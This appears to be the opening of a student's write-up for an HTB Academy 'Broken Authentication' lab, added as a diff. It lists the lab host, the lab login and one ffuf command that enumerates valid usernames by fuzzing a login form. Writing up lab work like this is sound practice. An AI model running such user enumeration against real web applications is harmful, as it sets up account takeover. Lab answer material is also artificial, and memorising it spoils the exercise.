@@ -1,0 +1,10 @@
+###Broken Authentication
+
+Question #1
+Authenticate to 154.57.164.83:30757 with user "htb-stdnt" and password "Academy_student!"
+
+Enumerate a valid user on the web application. Provide the username as the answer.
+
+Step 1: Ran the follow FFUF command
+  -ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.83:30757/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=random" -fr "Unknown user"
+
